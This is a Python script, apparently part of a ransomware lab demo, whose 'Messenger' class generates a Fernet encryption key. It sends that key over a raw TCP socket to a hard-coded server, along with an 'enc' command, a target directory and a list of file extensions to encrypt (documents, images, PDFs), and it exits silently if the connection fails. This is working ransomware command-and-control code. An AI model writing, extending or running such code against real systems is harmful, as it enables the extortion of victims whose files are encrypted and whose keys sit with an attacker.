import argparse
import gc
import json
import socket

from cryptography.fernet import Fernet


class Messenger:
    def __init__(self, command, directory, server_host, server_port, file_extensions):
        self.command = command
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port
        self.file_extensions = file_extensions
        self.key = Fernet.generate_key()

    def collect_data(self):
        return {
            'key': self.key.decode(),
            'cmd': self.command,
            'target_directory': self.directory,
            'file_extensions': self.file_extensions
        }

    def send_data_to_server(self):
        data = self.collect_data()
        print(f"data:{json.dumps(data)}")
        self.send_to_server(json.dumps(data))

    def send_to_server(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_host, self.server_port))
                s.sendall(data.encode())

                # Receive response from the server
                response = s.recv(4096).decode()

                # Print the response
                print("Response from server:", response)
        except:
            quit(0)

    def clear_memory(self):
        gc.collect()
        print("Memory cleared.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Example application that uses argparse to parse command line arguments.')

    # Add arguments
    parser.add_argument('--command', type=str, default='enc')
    parser.add_argument('--file_extensions', nargs='*', default=['.txt', '.docx', '.jpg', '.png', '.pdf'],
                        help='List of file extensions to encrypt')
    parser.add_argument('--directory', type=str, default='/home/kali/Desktop/demo/', help='Target directory')
    parser.add_argument('--server_host', type=str, default='192.168.181.129', help='Target server')
    parser.add_argument('--server_port', type=int, default=12345, help='Target server')

    # Parse arguments
    args = parser.parse_args()

    messenger = Messenger(args.command, args.directory, args.server_host, args.server_port, args.file_extensions)
    messenger.send_data_to_server()
    messenger.clear_memory()
